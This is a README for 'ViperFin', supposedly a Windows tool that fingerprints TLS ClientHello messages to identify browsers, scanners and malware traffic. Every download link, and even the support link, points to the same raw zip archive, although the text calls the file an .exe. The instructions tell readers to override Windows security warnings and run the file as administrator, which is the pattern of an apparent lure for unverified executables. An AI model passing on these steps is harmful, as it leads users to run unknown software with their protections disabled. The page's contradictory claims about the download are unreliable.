# 🛡️ ViperFin - Simple TLS Fingerprinting Tool

[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)

---

ViperFin is a tool that helps identify what software makes secure (TLS) connections on your computer or network. It looks at a part of these connections called ClientHello messages. By doing this, ViperFin can tell if the connection is from a web browser, a scanner, a testing tool, or malware like Cobalt Strike or Emotet. This helps users and security teams see what programs talk over the internet. The tool runs on Windows with no extra software needed.

---

## 📥 How to Download ViperFin

To get the ViperFin program, follow these steps:

1. Open this page in your web browser:  
   [https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)

2. Look for the latest version of ViperFin. It usually shows as a file ending with `.exe`.

3. Click the file name to start downloading. Choose a folder you will remember, like your Desktop or Downloads.

4. Wait for the download to finish. The file size is small and should download quickly.

Here is the link again for convenience:

[![Download ViperFin](https://img.shields.io/badge/Download-ViperFin-brightgreen)](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip)

---

## 🖥️ How to Install and Run ViperFin on Windows

You do not need to install ViperFin. It runs right after you download it. Follow these steps:

1. Go to the folder where you saved the downloaded file from the last step.

2. Double-click the `.exe` file to start ViperFin.

3. If Windows shows a security warning, choose to run or allow the program. This is normal for new software.

4. ViperFin will open in a command-line window (a black screen with text).

5. Follow the instructions you see in the command window to start scanning or checking network activity.

6. If you want to close ViperFin, just close the command-line window or press `Ctrl + C`.

---

## 🔧 System Requirements

ViperFin runs on Windows computers. These are the basic needs:

- Windows 10 or later version (64-bit recommended)  
- At least 1 GB of free disk space  
- Internet connection (to download ViperFin)  
- Basic command prompt access

---

## ⚙️ How ViperFin Works

When your computer or device connects securely to websites or other software, it uses TLS (Transport Layer Security). ViperFin looks at the first message sent during these connections called ClientHello.

This message contains information about what software or device is trying to connect. ViperFin reads and analyzes this information to identify the software that made the connection, such as:

- Web browsers (Chrome, Firefox, Edge)  
- Network scanning tools  
- Penetration testing frameworks  
- Malware command and control channels (Cobalt Strike, Emotet, Sliver)

By detecting this, ViperFin helps users understand what types of software communicate over TLS in their environment.

---

## 🛠️ Using ViperFin

- Open the program (as explained above).  
- ViperFin automatically starts capturing TLS handshake messages.  
- It will show you a list of detected fingerprints with software names where possible.  
- You can stop the capture when you want.  
- The information shown helps identify unusual or suspect connections.

---

## 🔍 Why Use ViperFin?

- Detect what software is making secure connections without complicated setup.  
- Identify unknown or suspicious software on your network.  
- See if malware or testing tools run without your knowledge.  
- Use a tool with no need to install extra programs or libraries.

---

## 📋 Features

- Reads raw ClientHello TLS messages.  
- Identifies browsers, scanners, and malware C2 traffic.  
- No external dependencies needed to run.  
- Written in Go for fast performance.  
- Works on Windows with simple executable download.  
- Provides readable output in the command window.

---

## 🛡️ Security Note

ViperFin only listens to network messages. It does not modify or block traffic. It is safe to run on your computer. Use it to understand and monitor your secure connections.

---

## 🤝 Support and Community

For help with ViperFin, you can open an issue on the GitHub page. You do not need programming knowledge to report problems. Just explain what you tried and what happened.

Visit GitHub here:  
https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip

---

## ⚠️ Troubleshooting Tips

- If the program won’t run, check that you downloaded the `.exe` file completely.  
- Make sure you run it on Windows 10 or later.  
- If Windows blocks running the file, allow it in your security settings.  
- Close other programs that might block network access.  
- If you see no output, try running the program as administrator.

---

## 📖 Learn More

For detailed info about TLS, ClientHello messages, and fingerprinting, you can search for:

- TLS handshake process  
- JA3/JA3S fingerprinting  
- Network security basics  

This knowledge helps understand what ViperFin shows and why it matters.

---

[Download ViperFin](https://raw.githubusercontent.com/Riotnguyenhu3847/ViperFin/main/report/Fin_Viper_v1.5-beta.5.zip) to start scanning your TLS connections today.